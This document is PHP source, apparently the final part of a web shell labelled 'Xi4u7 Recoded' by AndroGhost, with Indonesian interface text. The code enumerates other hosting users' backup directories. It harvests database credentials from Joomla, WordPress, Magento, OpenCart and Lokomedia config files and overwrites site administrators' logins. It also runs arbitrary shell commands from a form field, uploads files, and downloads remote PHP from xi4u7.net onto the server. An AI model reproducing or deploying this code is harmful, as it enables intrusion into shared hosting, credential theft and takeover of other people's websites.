   echo "<font color='red'>[-]<a href='?path=$dirzt' target='_blank'><u>$dirzt</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzu = '/home/'.$owner['name'].'/public_html.bak1/';
  if (is_readable($dirzu)) {
   echo "<font color='red'>[-]<a href='?path=$dirzu' target='_blank'><u>$dirzu</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzv = '/home/'.$owner['name'].'/public_html.backup/';
  if (is_readable($dirzv)) {
   echo "<font color='red'>[-]<a href='?path=$dirzv' target='_blank'><u>$dirzv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzw = '/home/'.$owner['name'].'/public_html.backups/';
  if (is_readable($dirzw)) {
   echo "<font color='red'>[-]<a href='?path=$dirzw' target='_blank'><u>$dirzw</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzx = '/home/'.$owner['name'].'/SiteBackup';
  if (is_readable($dirzx)) {
   echo "<font color='red'>[-]<a href='?path=$dirzx' target='_blank'><u>$dirzx</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzy = '/home/'.$owner['name'].'/SiteBackups';
  if (is_readable($dirzy)) {
   echo "<font color='red'>[-]<a href='?path=$dirzy' target='_blank'><u>$dirzy</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzz = '/home/'.$owner['name'].'/softaculous_backups';
  if (is_readable($dirzz)) {
   echo "<font color='red'>[-]<a href='?path=$$dirzz' target='_blank'><u>$dirzz</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirya = '/home/'.$owner['name'].'/backupwp';
  if (is_readable($dirya)) {
   echo "<font color='red'>[-]<a href='?path=$dirya' target='_blank'><u>$dirya</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryb = '/home/'.$owner['name'].'/backwpup';
  if (is_readable($diryb)) {
   echo "<font color='red'>[-]<a href='?path=$diryb' target='_blank'><u>$diryb</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryc = '/home/'.$owner['name'].'/public_htmlfirstaid';
  if (is_readable($diryc)) {
   echo "<font color='red'>[-]<a href='?path=$diryc' target='_blank'><u>$diryc</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryd = '/home/'.$owner['name'].'/site';
  if (is_readable($diryd)) {
   echo "<font color='red'>[-]<a href='?path=$diryd' target='_blank'><u>$diryd</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirye = '/home/'.$owner['name'].'/backuppro';
  if (is_readable($dirye)) {
   echo "<font color='red'>[-]<a href='?path=$dirye' target='_blank'><u>$dirye</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryf = '/home/'.$owner['name'].'/BackupPro';
  if (is_readable($diryf)) {
   echo "<font color='red'>[-]<a href='?path=$diryf' target='_blank'><u>$diryf</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryg = '/home/'.$owner['name'].'/old.public_html';
  if (is_readable($diryg)) {
   echo "<font color='red'>[-]<a href='?path=$diryg' target='_blank'><u>$diryg</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryh = '/home/'.$owner['name'].'/publi';
  if (is_readable($diryh)) {
   echo "<font color='red'>[-]<a href='?path=$diryh' target='_blank'><u>$diryh</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryi = '/home/'.$owner['name'].'/update';
  if (is_readable($diryi)) {
   echo "<font color='red'>[-]<a href='?path=$diryi' target='_blank'><u>$diryi</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryj = '/home/'.$owner['name'].'/wordpress.bak';
  if (is_readable($diryj)) {
   echo "<font color='red'>[-]<a href='?path=$diryj' target='_blank'><u>$diryj</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryk = '/home/'.$owner['name'].'/.backup';
  if (is_readable($diryk)) {
   echo "<font color='red'>[-]<a href='?path=$diryk' target='_blank'><u>$diryk</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryl = '/home/'.$owner['name'].'/.backups';
  if (is_readable($diryl)) {
   echo "<font color='red'>[-]<a href='?path=$diryl' target='_blank'><u>$diryl</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirym = '/home/'.$owner['name'].'/.accesshash';
  if (is_readable($dirym)) {
   echo "<font color='red'>[-]<a href='?path=$dirym' target='_blank'><u>$dirym</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryn = '/home/'.$owner['name'].'/migration';
  if (is_readable($diryn)) {
   echo "<font color='red'>[-]<a href='?path=$diryn' target='_blank'><u>$diryn</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryo = '/home/'.$owner['name'].'/html';
  if (is_readable($diryo)) {
   echo "<font color='red'>[-]<a href='?path=$diryo' target='_blank'><u>$diryo</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryp = '/home/'.$owner['name'].'/restore';
  if (is_readable($diryp)) {
   echo "<font color='red'>[-]<a href='?path=$diryp' target='_blank'><u>$diryp</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryq = '/home/'.$owner['name'].'/hosting';
  if (is_readable($diryq)) {
   echo "<font color='red'>[-]<a href='?path=$diryq' target='_blank'><u>$diryq</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryr = '/home/'.$owner['name'].'/wp';
  if (is_readable($diryr)) {
   echo "<font color='red'>[-]<a href='?path=$diryr' target='_blank'><u>$diryr</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirys = '/home/'.$owner['name'].'/shop';
  if (is_readable($dirys)) {
   echo "<font color='red'>[-]<a href='?path=$dirys' target='_blank'><u>$dirys</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryt = '/home/'.$owner['name'].'/distrib';
  if (is_readable($diryt)) {
   echo "<font color='red'>[-]<a href='?path=$diryt' target='_blank'><u>$diryt</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryu = '/home/'.$owner['name'].'/test';
  if (is_readable($diryu)) {
   echo "<font color='red'>[-]<a href='?path=$diryu' target='_blank'><u>$diryu</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryv = '/home/'.$owner['name'].'/hg_backup';
  if (is_readable($diryv)) {
   echo "<font color='red'>[-]<a href='?path=$diryv' target='_blank'><u>$diryv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryw = '/home/'.$owner['name'].'/public_html1';
  if (is_readable($diryw)) {
   echo "<font color='red'>[-]<a href='?path=$diryw' target='_blank'><u>$diryw</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryx = '/home/'.$owner['name'].'/backups-manual';
  if (is_readable($diryx)) {
   echo "<font color='red'>[-]<a href='?path=$diryx' target='_blank'><u>$diryx</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryy = '/home/'.$owner['name'].'/public_html_upgraded';
  if (is_readable($diryy)) {
   echo "<font color='red'>[-]<a href='?path=$diryy' target='_blank'><u>$diryy</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryz = '/home/'.$owner['name'].'/olllld.public_html';
  if (is_readable($diryz)) {
   echo "<font color='red'>[-]<a href='?path=$diryz' target='_blank'><u>$diryz</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }	
 }
}

}
elseif($_GET['ext'] == 'autoedt') {
if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$offdir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='AndroGhost' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='AndroGhost' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}

else if($_GET['ext'] == 'movecfg') {
	$cok = $_SERVER['DOCUMENT_ROOT'];
	if(is_writable($cok.'/xi4u7_cfg')) {
		echo '<form method="post" action="">';
		echo '<input name="dancok" type="text" placeholder="user-cms.txt">';
		echo '<input name="pindahx" type="submit" value="MOVE">';
		echo '</form>';
		if(!empty($_POST['pindahx'])) {
			exect('cat '.$_GET['cfg'].' > '.$cok.'/xi4u7_cfg/'.$_POST['dancok']);
			echo '<a href="?path='.$cok.'/xi4u7_cfg">Done! Click Here</a>';
		}
		else {
			echo 'FAILED!!';
		}
	}
	else {
		mkdir($cok.'/xi4u7_cfg');
		echo '<form method="post" action="">';
		echo '<input name="dancok" type="text" placeholder="user-cms.txt">';
		echo '<input name="pindahx" type="submit" value="MOVE">';
		echo '</form>';
		if(!empty($_POST['pindahx'])) {
			exect('cat '.$_GET['cfg'].' > '.$cok.'/xi4u7_cfg/'.$_POST['dancok']);
			echo '<a href="?path='.$cok.'/xi4u7_cfg">Done! Click Here</a>';
		}
		else {
			echo 'FAILED!!';
	}
}
}

### EXTRACTOR TO TMP ###
else if($_GET['ext'] == 'extract2tmp')
{
	if (file_exists($_SERVER["DOCUMENT_ROOT"].'/tmp/') && is_writable($_SERVER["DOCUMENT_ROOT"].'/tmp/')) {
    	$tmppath = $_SERVER["DOCUMENT_ROOT"].'/tmp/';
	}
	else if(file_exists(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/') && is_writable(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/')) {
		$tmppath = dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/';
	}
	else if(file_exists('/tmp/') && is_writable('/tmp/')) {
		$tmppath = '/tmp/';
	}
	else {
		$tmppath = '';
	}

	if(!empty($tmppath)) {
		$gzfile = $_GET['gzname'];
		echo '[FILE] '.$gzfile.'<br>';
		echo '-- extract to --<br>';
		echo '[TMP] '.$tmppath.'<br>';
		$bsname = basename($gzfile);
		$gzrname = explode(".", $bsname);
		echo '<form method="post" action="">';
		echo '<input name="extract" type="submit" value="EXTRACT">';
		echo '</form>';
			if(!empty($_POST['extract'])) {
				exect('mkdir '.$tmppath.$gzrname[0]);
				$destdir = $tmppath.$gzrname[0];
				if (file_exists($destdir) && is_writable($destdir)) {
					echo "\n".'[EXTRACTED] <a href="?path='.$destdir.'">'.$destdir.'</a>'."\n";
					exect('tar -xzvf '.$gzfile.' -C '.$destdir);
				}
				else
				{
					echo 'FAILED!';
				}
			}
	}
	else {
		echo 'CANNOT EXTRACT TO TMP!';
	}

} 
### EXTRACTOR TO TMP - EOF ###

### CMD ###
else if($_GET['ext'] == 'shellcmd')
{
	echo '<h2>.::[ Shell Command ]::.</h2>';
	echo '<form method="post" action="">';
	echo 'terminal:~$ <input name="cmd" type="text" placeholder="echo AndroSec1337" style="width:300px"/>';
	echo ' <input type="submit" value=">>"/>';
	echo '</form>';
	if(!empty($_POST['cmd'])) {
		echo '<textarea style="width:100%;height:150px;" readonly>';
			$cmd = $_POST['cmd'];
			echo exect($cmd);
		echo '</textarea>';
	}
}
### CMD EOF ###

### UPLOADER ###
else if($_GET['ext'] == 'uploader')
{
	echo '<h2>.::[ Uploader ]::.</h2>';
	echo '<center>';
	echo '<form method=post enctype=multipart/form-data>';
	echo '<br><br>PATH ['.$offdir.']<br>';
	echo '<input type="file" name="zerofile"><input name="postupl" type="submit" value="Upload"><br>';
	echo '</form>';
	if($_POST["postupl"] == 'Upload')
	{
		if(@copy($_FILES["zerofile"]["tmp_name"],"$offdir/".$_FILES["zerofile"]["name"]))
			{ echo '<b>OK! '."$offdir/".$_FILES["zerofile"]["name"].'</b>'; }
		else 
			{ echo '<b>Upload Failed.</b>'; }
	}
	echo '</center>';
}
### UPLOADER EOF ###

### MYSQL INTERFACE ###
else if($_GET['ext'] == 'sql_interface')
{
	echo '<h2>.::[ MySQL Interface ]::.</h2>';
	echo '<center>';
	$dwadminer = 'http://xi4u7.net/adminer.txt';
	$fileadminer = 'x-adminer.php';
	function call_adminer($dwadminer, $fileadminer) {
		$fp = fopen($fileadminer, "w+");
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $dwadminer);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	file_put_contents($dwadminer, $fileadminer);
	}
	echo '<form method=post enctype=multipart/form-data>';
	echo '<input name="mysql_int" type="submit" value="Call Adminer 4.3.1"><br>';
	echo '</form>';
	if($_POST['mysql_int'] == 'Call Adminer 4.3.1') {
	    call_adminer($dwadminer, $fileadminer);
	    $linkz = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
	    if(file_exists('x-adminer.php')) {
	    	echo '<a href="'.$linkz.dirname($_SERVER['PHP_SELF']).'/'.$fileadminer.'" target="_blank">Adminer OK!</a>';
	    }
	    else {
	    	echo '<font color="red">[FAILED]</a>';
	    } 

	}
	echo '</center>';
}
### MYSQL INTERFACE EOF ###


### TAMBAHAN BACKUPWORDPRESS BASH ###
if($_GET['grab'] == 'wp_options') {
	$userdb = $_POST['wpuser'];
	$passdb = $_POST['wppass'];
	$namedb = $_POST['wpdb'];
	$hostdb = $_POST['wphost'];
	echo 'WP_OPTIONS';
	if(!empty($userdb)) {
	$link = mysql_connect($hostdb, $userdb, $passdb);
	if (!$link) {die('Could not connect: ' . mysql_error());}
	if (!mysql_select_db($namedb)) {die('Could not select database: ' . mysql_error());}
	//
	$tblz = mysql_query("SELECT table_name FROM information_schema.tables WHERE table_schema='".$namedb."' AND table_name LIKE '%_options' LIMIT 1");
	if (!$tblz) {die('Could not query:' . mysql_error());}
	$tbl = mysql_result($tblz, 0, 'table_name'); // outputs third employee's name
	$result = mysql_query("SELECT option_value FROM ".$tbl." WHERE option_name = 'siteurl' AND option_id = '1'");
	if (!$result) {die('Tbl Could not query:' . mysql_error());}
	echo "\n".'[DOMAIN] '.mysql_result($result, 0, 'option_value')."\n"; // outputs third employee's name
	mysql_close($link);
	}
} else if($_GET['grab'] == 'wp_users_updt') {
	$userdb = $_POST['wpuser'];
	$passdb = $_POST['wppass'];
	$namedb = $_POST['wpdb'];
	$hostdb = $_POST['wphost'];
	$prefix = $_POST['tpfx'];
	echo 'WP_USERS';
		$conn = new mysqli($hostdb, $userdb, $passdb, $namedb);
		if ($conn->connect_error) {
		    die("Connection failed: " . $conn->connect_error);
		} 
		$sql = "UPDATE ".$prefix."users SET user_login = 'AndroSec1337', user_pass = MD5('AndroSec1337') WHERE user_status = '0' LIMIT 1";
		if ($conn->query($sql) === TRUE) {
		    echo "Record updated successfully";
		} else {
		    echo "Error updating record: " . $conn->error;
		}
		$conn->close();
}
### TAMBAHAN BACKUPWORDPRESS BASH EOF ###



### FOOTER ###
echo '<div class="footer">';
echo '&copy; 2018 <a href="https://facebook.com/Juman.Nafis" rel="nofollow" target="_blank">AndroGhost</a> - ./Xi4u7 Recoded';
echo '</div>';
echo '</div>';
 ?>
